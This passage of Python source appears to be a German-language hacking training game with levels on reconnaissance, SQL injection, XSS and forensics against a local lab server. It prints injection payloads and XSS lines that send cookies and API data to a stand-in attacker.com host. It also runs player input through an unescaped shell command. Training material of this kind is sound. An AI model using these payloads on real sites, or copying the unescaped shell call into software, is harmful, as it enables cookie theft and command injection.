        """
        
        # Clear screen first
        os.system('cls' if os.name == 'nt' else 'clear')
        
        # Type the banner character by character
        for line in banner.split('\n'):
            self.simulate_old_terminal(line, delay=0.005)
            time.sleep(0.1)
        
        time.sleep(1)
        print("\n" + "="*70)
        self.simulate_old_terminal("INITIALIZING HACKING SIMULATOR...", delay=0.03)
        self.simulate_old_terminal("LOADING VULNERABILITY DATABASE...", delay=0.03)
        self.simulate_old_terminal("ESTABLISHING SECURE CONNECTION...", delay=0.03)
        self.simulate_old_terminal("READY FOR MISSION, AGENT.", delay=0.03)
        print("="*70)
        time.sleep(2)

    def level_1_server_hacking(self):
        """Level 1: Web Application Reconnaissance & Information Gathering"""
        self.simulate_old_terminal("\n🌐 MISSION: Führe eine umfassende Web Application Reconnaissance durch!", delay=0.02)
        self.simulate_old_terminal("💡 TIPP: Lerne echte Web Application Security Testing-Techniken!", delay=0.02)
        self.echo_chat("hint")

        # Get the target value for this level
        target_value = self.get_target_value(1)

        # Get platform-specific commands
        commands = self.get_platform_commands()
        
        # Comprehensive Web App Security Tutorial with retro effects
        self.simulate_old_terminal("\n" + "="*70, delay=0.01)
        self.simulate_old_terminal("📚 TUTORIAL: Web Application Security Testing", delay=0.02)
        self.simulate_old_terminal("="*70, delay=0.01)
        
        self.simulate_old_terminal(f"\n🔍 INFORMATION GATHERING ({sys.platform.upper()}):", delay=0.02)
        self.simulate_old_terminal(f"   {commands['http_headers']}     → HTTP Headers analysieren", delay=0.02)
        self.simulate_old_terminal(f"   {commands['http_methods']} → HTTP Methods entdecken", delay=0.02)
        self.simulate_old_terminal(f"   {commands['web_scan']}     → Silent HTTP Request", delay=0.02)
        self.simulate_old_terminal("   curl -s -L http://127.0.0.1:5000/  → Follow Redirects (Silent)", delay=0.02)
        
        self.simulate_old_terminal("\n🎯 DIRECTORY & FILE DISCOVERY:", delay=0.02)
        self.simulate_old_terminal("   curl http://127.0.0.1:5000/.env.local → Environment Files", delay=0.02)
        self.simulate_old_terminal("   curl http://127.0.0.1:5000/robots.txt → Robots.txt", delay=0.02)
        self.simulate_old_terminal("   curl http://127.0.0.1:5000/sitemap.xml → Sitemap", delay=0.02)
        self.simulate_old_terminal("   curl http://127.0.0.1:5000/.git/ → Git Repository", delay=0.02)
        
        self.simulate_old_terminal("\n🔍 ENDPOINT DISCOVERY:", delay=0.02)
        self.simulate_old_terminal("   curl http://127.0.0.1:5000/debug   → Debug Endpoints", delay=0.02)
        self.simulate_old_terminal("   curl http://127.0.0.1:5000/api/    → API Endpoints", delay=0.02)
        self.simulate_old_terminal("   curl http://127.0.0.1:5000/admin   → Admin Panels", delay=0.02)
        self.simulate_old_terminal("   curl http://127.0.0.1:5000/login   → Authentication", delay=0.02)
        self.simulate_old_terminal("   curl http://127.0.0.1:5000/ssrf    → SSRF Vulnerability", delay=0.02)
        self.simulate_old_terminal("   curl http://127.0.0.1:5000/command → Command Injection", delay=0.02)
        self.simulate_old_terminal("   curl http://127.0.0.1:5000/ldap    → LDAP Injection", delay=0.02)
        self.simulate_old_terminal("   curl http://127.0.0.1:5000/nosql   → NoSQL Injection", delay=0.02)
        
        self.simulate_old_terminal(f"\n🛡️ SECURITY HEADERS ANALYSIS ({sys.platform.upper()}):", delay=0.02)
        self.simulate_old_terminal(f"   {commands['http_headers']} | {commands['grep']} security", delay=0.02)
        self.simulate_old_terminal(f"   {commands['http_headers']} | {commands['grep']} x-", delay=0.02)
        self.simulate_old_terminal(f"\n🎯 ZIEL: Finde den API-Key durch Reconnaissance: {target_value[:8]}...", delay=0.02)
        self.simulate_old_terminal("="*70, delay=0.01)

        self.simulate_old_terminal(f"\n🔍 ZIEL: Finde den API-Key: {target_value[:8]}...", delay=0.02)
        self.simulate_old_terminal("💻 Verwende echte Web Application Security Testing", delay=0.02)

        while True:
            self.simulate_old_terminal("\n💡 VERFÜGBARE TECHNIQUEN:", delay=0.02)
            self.simulate_old_terminal("  - Information Gathering", delay=0.02)
            self.simulate_old_terminal("  - Directory & File Discovery", delay=0.02)
            self.simulate_old_terminal("  - Endpoint Discovery", delay=0.02)
            self.simulate_old_terminal("  - Security Headers Analysis", delay=0.02)
            self.simulate_old_terminal("  - HTTP Method Testing", delay=0.02)

            cmd = input("\nGib deinen Reconnaissance-Befehl ein: ").strip()

            if cmd == "/echo":
                self.echo_chat("hint")
                continue
            elif cmd == "/help":
                self.show_level_help(1)
                continue

            # Check if player entered the target value directly
            if cmd == target_value:
                self.simulate_old_terminal(f"\n🎉 ERFOLG! Du hast den API-Key gefunden: {target_value}", delay=0.02)
                self.simulate_old_terminal("🏆 Level 1 abgeschlossen! +100 Punkte", delay=0.02)
                self.simulate_old_terminal("\n📚 WAS DU GELERNT HAST:", delay=0.02)
                self.simulate_old_terminal("   • Web Application Reconnaissance", delay=0.02)
                self.simulate_old_terminal("   • Information Gathering Techniques", delay=0.02)
                self.simulate_old_terminal("   • Directory & File Discovery", delay=0.02)
                self.simulate_old_terminal("   • Security Headers Analysis", delay=0.02)
                self.simulate_old_terminal("   • HTTP Method Testing", delay=0.02)
                self.simulate_old_terminal("\n🛡️ SO KANNST DU DICH DAVOR SCHÜTZEN:", delay=0.02)
                self.simulate_old_terminal("   • .env.local nie ins Git committen", delay=0.02)
                self.simulate_old_terminal("   • Sensitive Dateien in .gitignore", delay=0.02)
                self.simulate_old_terminal("   • Debug-Modi in Produktion deaktivieren", delay=0.02)
                self.simulate_old_terminal("   • Security Headers setzen (HSTS, CSP, etc.)", delay=0.02)
                self.simulate_old_terminal("   • HTTP Methods einschränken", delay=0.02)
                self.score += 100
                break

            try:
                # Execute the command with proper encoding handling
                result = subprocess.run(cmd, shell=True, capture_output=True, text=True, 
                                    timeout=15, encoding='utf-8', errors='replace')

                # Simulate old terminal command execution
                self.simulate_command_execution(cmd, result.stdout)
                
                # Only show error if there's actual stderr content (not just curl progress info)
                if result.stderr and result.stderr.strip() and not result.stderr.startswith('  % Total'):
                    self.typewriter_effect("⚠️  FEHLER:", delay=0.02, color_code="31")
                    self.typewriter_effect(result.stderr, delay=0.01, color_code="31")

                # Check for specific success indicators - only real API key finds
                success_indicators = [
                    target_value in (result.stdout or ""),
                    "API_KEY" in (result.stdout or ""),
                    "api_key" in (result.stdout or "")
                ]

                if any(success_indicators):
                    self.simulate_old_terminal(f"\n🎉 ERFOLG! Du hast den API-Key gefunden: {target_value}", delay=0.02)
                    self.simulate_old_terminal("🏆 Level 1 abgeschlossen! +100 Punkte", delay=0.02)
                    self.simulate_old_terminal("\n📚 WAS DU GELERNT HAST:", delay=0.02)
                    self.simulate_old_terminal("   • Web Application Reconnaissance", delay=0.02)
                    self.simulate_old_terminal("   • Information Gathering Techniques", delay=0.02)
                    self.simulate_old_terminal("   • Directory & File Discovery", delay=0.02)
                    self.simulate_old_terminal("   • Security Headers Analysis", delay=0.02)
                    self.simulate_old_terminal("   • HTTP Method Testing", delay=0.02)
                    self.simulate_old_terminal("\n🛡️ SO KANNST DU DICH DAVOR SCHÜTZEN:", delay=0.02)
                    self.simulate_old_terminal("   • .env.local nie ins Git committen", delay=0.02)
                    self.simulate_old_terminal("   • Sensitive Dateien in .gitignore", delay=0.02)
                    self.simulate_old_terminal("   • Debug-Modi in Produktion deaktivieren", delay=0.02)
                    self.simulate_old_terminal("   • Security Headers setzen (HSTS, CSP, etc.)", delay=0.02)
                    self.simulate_old_terminal("   • HTTP Methods einschränken", delay=0.02)
                    self.score += 100
                    break

            except subprocess.TimeoutExpired:
                self.simulate_old_terminal("⏰ Befehl ist abgelaufen. Probiere einen anderen Ansatz.", delay=0.02)
            except Exception as e:
                self.simulate_old_terminal(f"❌ Befehl fehlgeschlagen: {e}", delay=0.02)

        self.simulate_old_terminal("\n✅ Level 1 abgeschlossen!", delay=0.02)
        self.current_level = 2

    def level_2_network_fundamentals(self):
        """Level 2: Network Discovery & Reconnaissance with real server communication"""
        self.simulate_old_terminal("\n🌐 MISSION: Führe eine umfassende Netzwerk-Rekonnaissance durch!", delay=0.02)
        self.simulate_old_terminal("💡 TIPP: Lerne echte Hacking-Techniken für Network Discovery!", delay=0.02)
        self.echo_chat("hint")

        # Get the target value for this level
        target_value = self.get_target_value(2)

        # Get platform-specific commands
        commands = self.get_platform_commands()

        # Comprehensive Tutorial
        print("\n" + "="*70)
        print("📚 TUTORIAL: Network Discovery & Reconnaissance")
        print("="*70)
        print(f"\n🔍 PORT SCANNING ({sys.platform.upper()}):")
        if sys.platform.startswith('win'):
            print(f"   {commands['port_scan']}     → Port Status prüfen")
            print(f"   {commands['port_scan_alt']}           → Port Connectivity Test")
            print(f"   {commands['port_scan_ps']}")
            print(f"   {commands['http_headers']}  → HTTP Service Detection")
        else:
            print(f"   {commands['port_scan']}              → Stealth SYN Scan")
            print(f"   {commands['port_scan_alt']}              → TCP Connect Scan")
            print(f"   {commands['port_scan_udp']}              → UDP Scan")
            print(f"   {commands['port_scan_all']}              → Alle Ports scannen")
            print(f"   {commands['port_scan_service']}              → Service Detection")
            print(f"   {commands['port_scan_os']}               → OS Detection")

        print(f"\n🌐 WEB APPLICATION SCANNING ({sys.platform.upper()}):")
        print(f"   {commands['web_scan']}  → Basic Web Scan")
        if not sys.platform.startswith('win'):
            print(f"   {commands['web_scan_nikto']}  → Vulnerability Scanner")
            print(f"   {commands['web_scan_dirb']}     → Directory Brute-Force")
            print(f"   {commands['web_scan_gobuster']}")
        print(f"   {commands['http_methods']} → HTTP Methods")
        if sys.platform.startswith('win'):
            print(f"   {commands['web_scan_ps']}")

        print("\n🔍 ADVANCED VULNERABILITY TESTING:")
        print("   curl -X POST -d 'url=http://localhost:22' http://127.0.0.1:5000/ssrf")
        print("   curl -X POST -d 'cmd=whoami' http://127.0.0.1:5000/command")
        print("   curl -X POST -d 'username=admin)(&(password=*' http://127.0.0.1:5000/ldap")
        print("   curl -X POST -d 'username=admin&password={\"$ne\":null}' http://127.0.0.1:5000/nosql")
        print(f"\n🔍 SERVICE ENUMERATION ({sys.platform.upper()}):")
        print(f"   {commands['http_headers']}  → HTTP Headers analysieren")
        print(f"   {commands['http_methods']} → HTTP Methods")
        print(f"   {commands['web_scan']}  → Silent HTTP Request")
        print("\n🎯 ZIEL: Finde den API-Key durch Network Discovery: {target_value[:8]}...")
        print("="*70)

        print(f"\n🔍 ZIEL: Finde den API-Key: {target_value[:8]}...")
        print("💻 Verwende echte Network Discovery Tools")

        print("\n🎯 MISSION: Scanne den Server und finde versteckte Endpunkte!")
        print("💡 HINWEIS: Der API-Key ist in einem versteckten Endpunkt versteckt!")
        print("🔍 VERSUCHE: curl http://127.0.0.1:5000/api/secret oder ähnliche Endpunkte!")
        print("💡 TIPP: Manche Endpunkte brauchen spezielle Authentifizierung...")
        print("🔍 DENKE NACH: Was hast du in Level 1 gelernt?")

        while True:
            print(f"\n💡 VERFÜGBARE TOOLS ({sys.platform.upper()}):")
            if sys.platform.startswith('win'):
                print("  - netstat (Port Status Analysis)")
                print("  - telnet (Port Connectivity Test)")
                print("  - curl (HTTP Analysis)")
                print("  - powershell (Advanced Network Commands)")
                print("  - findstr (Text Search)")
            else:
                print("  - nmap (Port Scanning, Service Detection)")
                print("  - nikto (Web Vulnerability Scanner)")
                print("  - dirb/gobuster (Directory Brute-Force)")
                print("  - curl (HTTP Analysis)")
                print("  - netstat (Local Port Analysis)")
            print("\n🔍 ADVANCED VULNERABILITY TESTING:")
            print("  - SSRF: curl -X POST -d 'url=http://localhost:22' http://127.0.0.1:5000/ssrf")
            print("  - Command Injection: curl -X POST -d 'cmd=whoami' http://127.0.0.1:5000/command")
            print("  - LDAP Injection: curl -X POST -d 'username=admin)(&(password=*' http://127.0.0.1:5000/ldap")
            print("  - NoSQL Injection: curl -X POST -d 'username=admin&password={\"$ne\":null}' http://127.0.0.1:5000/nosql")

            cmd = input("\nGib deinen Reconnaissance-Befehl ein: ").strip()

            if cmd == "/echo":
                self.echo_chat("hint")
                continue
            elif cmd == "/help":
                self.show_level_help(2)
                continue

            try:
                # Execute the command with proper encoding handling
                result = subprocess.run(cmd, shell=True, capture_output=True, text=True,
                                    timeout=20, encoding='utf-8', errors='replace')

                # Show realistic command output
                print(f"\n💻 {self.player_name}@hacking-target:~$ {cmd}")

                # Enhanced curl command handling with real server communication
                if "curl" in cmd.lower() and ("127.0.0.1:5000" in cmd or "localhost:5000" in cmd):
                    server_response = self.execute_curl_command(cmd)
                    if server_response:
                        print("📄 SERVER ANTWORT:")
                        print(server_response)

                        # Check for success indicators in real server response
                        if self.check_level_success(2, server_response, cmd):
                            print(f"\n🎉 ERFOLG! Du hast den API-Key gefunden: {target_value}")
                            print("🏆 Level 2 abgeschlossen! +150 Punkte")
                            print("\n📚 WAS DU GELERNT HAST:")
                            print("   • Port Scanning mit nmap")
                            print("   • Service Detection und Enumeration")
                            print("   • Web Application Vulnerability Scanning")
                            print("   • Directory Brute-Forcing")
                            print("   • HTTP Header Analysis")
                            print("\n🛡️ SO KANNST DU DICH DAVOR SCHÜTZEN:")
                            print("   • API-Keys nie im Code hardcoden")
                            print("   • Rate-Limiting für API-Endpunkte")
                            print("   • IP-Whitelisting für sensible APIs")
                            print("   • API-Key-Rotation regelmäßig durchführen")
                            print("   • API-Gateway mit Authentifizierung verwenden")
                            self.score += 150
                            break
                    else:
                        print("📄 (Keine Antwort vom Server)")
                else:
                    # Handle non-curl commands
                    if result.stdout:
                        print("📄 AUSGABE:")
                        print(result.stdout)
                    elif result.stderr and result.stderr.strip() and not result.stderr.startswith('  % Total'):
                        print("⚠️  FEHLER:")
                        print(result.stderr)
                    else:
                        print("📄 (Keine Ausgabe)")

                    # Check for success in non-curl command output
                    if self.check_level_success(2, result.stdout or "", cmd):
                        print(f"\n🎉 ERFOLG! Du hast den API-Key gefunden: {target_value}")
                        print("🏆 Level 2 abgeschlossen! +150 Punkte")
                        print("\n📚 WAS DU GELERNT HAST:")
                        print("   • Port Scanning mit nmap")
                        print("   • Service Detection und Enumeration")
                        print("   • Web Application Vulnerability Scanning")
                        print("   • Directory Brute-Forcing")
                        print("   • HTTP Header Analysis")
                        print("\n🛡️ SO KANNST DU DICH DAVOR SCHÜTZEN:")
                        print("   • API-Keys nie im Code hardcoden")
                        print("   • Rate-Limiting für API-Endpunkte")
                        print("   • IP-Whitelisting für sensible APIs")
                        print("   • API-Key-Rotation regelmäßig durchführen")
                        print("   • API-Gateway mit Authentifizierung verwenden")
                        self.score += 150
                        break

                # Check if user directly entered the target value
                if cmd.strip() == target_value:
                    print(f"\n🎉 ERFOLG! Du hast den API-Key direkt eingegeben: {target_value}")
                    print("🏆 Level 2 abgeschlossen! +150 Punkte")
                    print("\n📚 WAS DU GELERNT HAST:")
                    print("   • Port Scanning mit nmap")
                    print("   • Service Detection und Enumeration")
                    print("   • Web Application Vulnerability Scanning")
                    print("   • Directory Brute-Forcing")
                    print("   • HTTP Header Analysis")
                    self.score += 150
                    break

            except subprocess.TimeoutExpired:
                print("⏰ Befehl ist abgelaufen. Probiere einen anderen Ansatz.")
            except Exception as e:
                print(f"❌ Befehl fehlgeschlagen: {e}")

        print("\n✅ Level 2 abgeschlossen!")
        self.current_level = 3

    def level_3_password_cracking(self):
        """Level 3: SQL Injection Attack with real server communication"""
        self.simulate_old_terminal("\n🔐 MISSION: Führe eine umfassende SQL Injection Attack durch!", delay=0.02)
        self.simulate_old_terminal("💡 TIPP: Lerne echte SQL Injection-Techniken!", delay=0.02)
        self.echo_chat("hint")

        # Get the target value for this level
        target_value = self.get_target_value(3)

        # Comprehensive SQL Injection Tutorial
        print("\n" + "="*70)
        print("📚 TUTORIAL: SQL Injection Attack Techniques")
        print("="*70)
        print("\n🎯 UNION-BASED SQL INJECTION:")
        print("   admin' UNION SELECT 1,2,3,4,5--")
        print("   admin' UNION SELECT username,password,email,role,id FROM users--")
        print("   admin' UNION SELECT table_name,column_name,1,2,3 FROM information_schema.columns--")
        print("\n🔍 BOOLEAN-BASED BLIND SQL INJECTION:")
        print("   admin' AND 1=1--")
        print("   admin' AND 1=2--")
        print("   admin' AND (SELECT COUNT(*) FROM users) > 0--")
        print("   admin' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin') = 'a'--")
        print("\n⏰ TIME-BASED BLIND SQL INJECTION:")
        print("   admin' AND (SELECT SLEEP(5))--")
        print("   admin' AND (SELECT IF(1=1,SLEEP(5),0))--")
        print("\n❌ ERROR-BASED SQL INJECTION:")
        print("   admin' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--")
        print("\n🎯 ZIEL: Extrahiere den Admin-Hash: {target_value[:8]}...")
        print("="*70)

        print(f"\n🔍 ZIEL: Finde den Admin-Hash: {target_value[:8]}...")
        print("💻 Verwende verschiedene SQL Injection-Techniken")

        while True:
            print("\n💡 VERFÜGBARE TECHNIQUEN:")
            print("  - Union-based SQL Injection")
            print("  - Boolean-based Blind SQL Injection")
            print("  - Time-based Blind SQL Injection")
            print("  - Error-based SQL Injection")
            print("  - Second-order SQL Injection")
            print("\n🔍 ADVANCED ATTACK VECTORS:")
            print("  - Race Condition: curl -X POST -d 'amount=500' http://127.0.0.1:5000/race")
            print("  - Business Logic: curl -X POST -d 'product_id=1&quantity=5&price=-100' http://127.0.0.1:5000/business-logic")
            print("  - Auth Bypass: curl -X POST -d 'user_id=1' http://127.0.0.1:5000/auth-bypass")

            payload = input("\nGib deine SQL Injection ein: ").strip()

            if payload == "/echo":
                self.echo_chat("hint")
                continue
            elif payload == "/help":
                self.show_level_help(3)
                continue

            try:
                # Test SQL injection with curl
                cmd = f"curl -X POST -d 'username={payload}&password=anything' http://127.0.0.1:5000/login"
                result = subprocess.run(cmd, shell=True, capture_output=True, text=True,
                                    timeout=15, encoding='utf-8', errors='replace')

                print("📄 SERVER ANTWORT:")
                if result.stdout:
                    print(result.stdout)
                else:
                    print("(Keine Ausgabe)")

                # Only show error if there's actual stderr content (not just curl progress info)
                if result.stderr and result.stderr.strip() and not result.stderr.startswith('  % Total'):
                    print("⚠️  FEHLER:")
                    print(result.stderr)

                # Enhanced success checking with real server response
                server_response = self.execute_curl_command(cmd)
                if server_response:
                    print("📄 ECHTE SERVER ANTWORT:")
                    print(server_response)

                    # Check for success indicators in real server response
                    if self.check_level_success(3, server_response, cmd):
                        print("\n🎉 ERFOLG! SQL Injection hat funktioniert!")
                        print("🏆 Level 3 abgeschlossen! +200 Punkte")
                        print("\n📚 WAS DU GELERNT HAST:")
                        print("   • Union-based SQL Injection")
                        print("   • Blind SQL Injection (Boolean & Time-based)")
                        print("   • Error-based SQL Injection")
                        print("   • Database Schema Enumeration")
                        print("   • Data Extraction Techniques")
                        print("\n🛡️ SO KANNST DU DICH DAVOR SCHÜTZEN:")
                        print("   • Prepared Statements verwenden (niemals String-Konkatenation)")
                        print("   • Input-Validierung und -Sanitization")
                        print("   • ORM-Frameworks verwenden")
                        print("   • Least Privilege Principle für DB-User")
                        print("   • WAF (Web Application Firewall) einsetzen")
                        self.score += 200
                        break

                # Check if user directly entered the target value
                if payload.strip() == target_value:
                    print(f"\n🎉 ERFOLG! Du hast den Admin-Hash direkt eingegeben: {target_value}")
                    print("🏆 Level 3 abgeschlossen! +200 Punkte")
                    print("\n📚 WAS DU GELERNT HAST:")
                    print("   • Union-based SQL Injection")
                    print("   • Blind SQL Injection (Boolean & Time-based)")
                    print("   • Error-based SQL Injection")
                    print("   • Database Schema Enumeration")
                    print("   • Data Extraction Techniques")
                    print("\n🛡️ SO KANNST DU DICH DAVOR SCHÜTZEN:")
                    print("   • Prepared Statements verwenden (niemals String-Konkatenation)")
                    print("   • Input-Validierung und -Sanitization")
                    print("   • ORM-Frameworks verwenden")
                    print("   • Least Privilege Principle für DB-User")
                    print("   • WAF (Web Application Firewall) einsetzen")
                    self.score += 200
                    break

            except subprocess.TimeoutExpired:
                print("⏰ Request ist abgelaufen.")
            except Exception as e:
                print(f"❌ Request fehlgeschlagen: {e}")

        print("\n✅ Level 3 abgeschlossen!")
        self.current_level = 4

    def level_4_web_exploitation(self):
        """Level 4: XSS (Cross-Site Scripting) Attack with real server communication"""
        self.simulate_old_terminal("\n🌐 MISSION: Führe eine umfassende XSS Attack durch!", delay=0.02)
        self.simulate_old_terminal("💡 TIPP: Lerne echte XSS-Techniken und Filter-Bypass!", delay=0.02)
        self.echo_chat("hint")

        # Get the target value for this level
        target_value = self.get_target_value(4)

        # Comprehensive XSS Tutorial
        print("\n" + "="*70)
        print("📚 TUTORIAL: XSS (Cross-Site Scripting) Attack Techniques")
        print("="*70)
        print("\n🎯 REFLECTED XSS:")
        print("   <script>alert('XSS')</script>")
        print("   <img src=x onerror=alert('XSS')>")
        print("   <svg onload=alert('XSS')>")
        print("   <iframe src=javascript:alert('XSS')>")
        print("\n💾 STORED XSS:")
        print("   <script>document.location='http://attacker.com/steal.php?cookie='+document.cookie</script>")
        print("   <img src=x onerror=this.src='http://attacker.com/steal.php?cookie='+document.cookie>")
        print("\n🌐 DOM-BASED XSS:")
        print("   <script>eval(location.hash.substring(1))</script>")
        print("   <script>setTimeout('alert(\\'XSS\\')', 1000)</script>")
        print("\n🔍 FILTER BYPASS TECHNIQUES:")
        print("   <ScRiPt>alert('XSS')</ScRiPt>")
        print("   <script>alert(String.fromCharCode(88,83,83))</script>")
        print("   <script>alert(/XSS/.source)</script>")
        print("   <script>alert`XSS`</script>")
        print("\n🎯 ZIEL: Extrahiere Session-Cookie: {target_value[:8]}...")
        print("="*70)

        print(f"\n🔍 ZIEL: Finde den Session-Cookie: {target_value[:8]}...")
        print("💻 Verwende verschiedene XSS-Techniken")

        while True:
            print("\n💡 VERFÜGBARE XSS-TECHNIQUEN:")
            print("  - Reflected XSS")
            print("  - Stored XSS")
            print("  - DOM-based XSS")
            print("  - Filter Bypass")
            print("  - Session Hijacking")
            print("\n🔍 ADVANCED XSS PAYLOADS:")
            print("  - <script>fetch('/api/users').then(r=>r.text()).then(d=>fetch('http://attacker.com/steal?data='+btoa(d)))</script>")
            print("  - <img src=x onerror=\"fetch('/api/admin/data').then(r=>r.text()).then(d=>alert('Admin Data: '+d))\">")
            print("  - <svg onload=\"fetch('/files/flag.txt').then(r=>r.text()).then(d=>alert('Flag: '+d))\">")

            payload = input("\nGib deine XSS-Payload ein: ").strip()

            if payload == "/echo":
                self.echo_chat("hint")
                continue
            elif payload == "/help":
                self.show_level_help(4)
                continue

            try:
                # Test XSS with curl
                cmd = f"curl -X POST -d 'comment={payload}' http://127.0.0.1:5000/comments"
                result = subprocess.run(cmd, shell=True, capture_output=True, text=True,
                                    timeout=10, encoding='utf-8', errors='replace')

                print("📄 SERVER ANTWORT:")
                if result.stdout:
                    print(result.stdout)
                else:
                    print("(Keine Ausgabe)")

                # Only show error if there's actual stderr content (not just curl progress info)
                if result.stderr and result.stderr.strip() and not result.stderr.startswith('  % Total'):
                    print("⚠️  FEHLER:")
                    print(result.stderr)

                # Enhanced success checking with real server response
                server_response = self.execute_curl_command(cmd)
                if server_response:
                    print("📄 ECHTE SERVER ANTWORT:")
                    print(server_response)

                    # Check for success indicators in real server response
                    if self.check_level_success(4, server_response, cmd):
                        print("\n🎉 ERFOLG! XSS Attack hat funktioniert!")
                        print("🏆 Level 4 abgeschlossen! +250 Punkte")
                        print("\n📚 WAS DU GELERNT HAST:")
                        print("   • Reflected XSS")
                        print("   • Stored XSS")
                        print("   • DOM-based XSS")
                        print("   • Filter Bypass Techniques")
                        print("   • Session Hijacking")
                        print("\n🛡️ SO KANNST DU DICH DAVOR SCHÜTZEN:")
                        print("   • Input-Escaping und Output-Encoding")
                        print("   • Content Security Policy (CSP) Headers")
                        print("   • HTTPOnly und Secure Flags für Cookies")
                        print("   • DOM Sanitization Libraries verwenden")
                        print("   • Template-Engines mit Auto-Escaping")
                        self.score += 250
                        break

                # Check if user directly entered the target value
                if payload.strip() == target_value:
                    print(f"\n🎉 ERFOLG! Du hast den Session-Cookie direkt eingegeben: {target_value}")
                    print("🏆 Level 4 abgeschlossen! +250 Punkte")
                    print("\n📚 WAS DU GELERNT HAST:")
                    print("   • Reflected XSS")
                    print("   • Stored XSS")
                    print("   • DOM-based XSS")
                    print("   • Filter Bypass Techniques")
                    print("   • Session Hijacking")
                    print("\n🛡️ SO KANNST DU DICH DAVOR SCHÜTZEN:")
                    print("   • Input-Escaping und Output-Encoding")
                    print("   • Content Security Policy (CSP) Headers")
                    print("   • HTTPOnly und Secure Flags für Cookies")
                    print("   • DOM Sanitization Libraries verwenden")
                    print("   • Template-Engines mit Auto-Escaping")
                    self.score += 250
                    break

            except subprocess.TimeoutExpired:
                print("⏰ Request ist abgelaufen.")
            except Exception as e:
                print(f"❌ Request fehlgeschlagen: {e}")

        print("\n✅ Level 4 abgeschlossen!")
        self.current_level = 5

    def level_5_advanced_topics(self):
        """Level 5: Digital Forensics & Advanced Hacking with real server communication"""
        self.simulate_old_terminal("\n🔬 MISSION: Führe eine umfassende Forensik-Analyse durch!", delay=0.02)
        self.simulate_old_terminal("💡 TIPP: Lerne echte Forensik-Techniken und Advanced Hacking!", delay=0.02)
        self.echo_chat("hint")

        # Get the target value for this level
        target_value = self.get_target_value(5)

        # Comprehensive Forensics Tutorial
        print("\n" + "="*70)
        print("📚 TUTORIAL: Digital Forensics & Advanced Hacking")
        print("="*70)
        print("\n🔍 MEMORY ANALYSIS (Windows):")
        print("   tasklist /v                    → Process List mit Details")
        print("   wmic process get name,pid,commandline → Process Command Lines")
        print("   powershell Get-Process | Select-Object Name,Id,Path")
        print("\n🌐 NETWORK TRAFFIC ANALYSIS (Windows):")
        print("   netstat -anb                    → Network Connections mit Prozessen")
        print("   netstat -an | findstr :5000     → Specific Port Analysis")
        print("   powershell Get-NetTCPConnection | Where-Object {$_.LocalPort -eq 5000}")
        print("\n🔐 CRYPTOGRAPHY ATTACKS (Windows):")
        print("   certutil -hashfile file.txt MD5 → File Hashing")
        print("   powershell Get-FileHash file.txt -Algorithm MD5")
        print("   powershell ConvertFrom-SecureString → Decrypt Secure Strings")
        print("\n🕵️ MALWARE ANALYSIS (Windows):")
        print("   strings malware.exe             → String Extraction")
        print("   file malware.exe                → File Type Detection")
        print("   powershell Get-ItemProperty malware.exe | Select-Object *")
        print("   objdump -d malware.exe")
        print("   strace -e trace=all ./malware")
        print("\n🎯 ZIEL: Finde den Encryption-Key: {target_value[:8]}...")
        print("="*70)

        print(f"\n🔍 ZIEL: Finde den Encryption-Key: {target_value[:8]}...")
        print("💻 Verwende echte Forensik-Tools")

        while True:
            print(f"\n💡 VERFÜGBARE FORENSIK-TOOLS ({sys.platform.upper()}):")
            if sys.platform.startswith('win'):
                print("  - Tasklist (Process Analysis)")
                print("  - Netstat (Network Analysis)")
                print("  - Certutil (Cryptography)")
                print("  - PowerShell (Advanced Analysis)")
                print("  - Strings (String Extraction)")
                print("  - WMIC (System Information)")
                print("\n🔍 ADVANCED FORENSIC TECHNIQUES (Windows):")
                print("  - Process Analysis: tasklist /v | findstr suspicious")
                print("  - Network Forensics: netstat -anb | findstr :5000")
                print("  - File Analysis: powershell Get-ItemProperty file.exe | Select-Object *")
                print("  - Registry Analysis: reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run")
            else:
                print("  - Volatility (Memory Analysis)")
                print("  - Wireshark/tshark (Network Analysis)")
                print("  - John the Ripper (Password Cracking)")
                print("  - Hashcat (Advanced Password Cracking)")
                print("  - OpenSSL (Cryptography)")
                print("  - Strings (String Extraction)")
                print("\n🔍 ADVANCED FORENSIC TECHNIQUES (Linux/Mac):")
                print("  - Memory Analysis: volatility -f memory.dump --profile=Win7SP1x64 pslist")
                print("  - Network Forensics: tshark -r capture.pcap -Y 'http.request.method==POST'")
                print("  - Steganography: steghide extract -sf hidden.jpg")
                print("  - File Carving: foremost -i disk.img -o output/")

            cmd = input("\nGib deinen Forensik-Befehl ein: ").strip()

            if cmd == "/echo":
                self.echo_chat("hint")
                continue
            elif cmd == "/help":
                self.show_level_help(5)
                continue

            try:
                # Execute the command with proper encoding handling
                result = subprocess.run(cmd, shell=True, capture_output=True, text=True,
                                    timeout=30, encoding='utf-8', errors='replace')

                # Show realistic command output
                print(f"\n💻 {self.player_name}@hacking-target:~$ {cmd}")

                # Enhanced curl command handling with real server communication
                if "curl" in cmd.lower() and ("127.0.0.1:5000" in cmd or "localhost:5000" in cmd):
                    server_response = self.execute_curl_command(cmd)
                    if server_response:
                        print("📄 SERVER ANTWORT:")
                        print(server_response)

                        # Check for success indicators in real server response
                        if self.check_level_success(5, server_response, cmd):
                            print("\n🎉 ERFOLG! Du hast den Encryption-Key gefunden!")
                            print("🏆 Level 5 abgeschlossen! +300 Punkte")
                            print("\n📚 WAS DU GELERNT HAST:")
                            print("   • Memory Analysis mit Volatility")
                            print("   • Network Traffic Analysis")
                            print("   • Password Cracking mit John/Hashcat")
                            print("   • Cryptography und Encryption")
                            print("   • Malware Analysis")
                            print("   • Digital Forensics")
                            print("\n🛡️ SO KANNST DU DICH DAVOR SCHÜTZEN:")
                            print("   • Starke Verschlüsselung verwenden (AES-256)")
                            print("   • Key-Management-Systeme (HSM) einsetzen")
                            print("   • Regular Security Audits durchführen")
                            print("   • Logging und Monitoring aktivieren")
                            print("   • Incident Response Plan bereithalten")
                            self.score += 300
                            break
                    else:
                        print("📄 (Keine Antwort vom Server)")
                else:
                    # Handle non-curl commands
                    if result.stdout:
                        print("📄 AUSGABE:")
                        print(result.stdout)
                    elif result.stderr and result.stderr.strip() and not result.stderr.startswith('  % Total'):
                        print("⚠️  FEHLER:")
                        print(result.stderr)
                    else:
                        print("📄 (Keine Ausgabe)")

                    # Check for success in non-curl command output
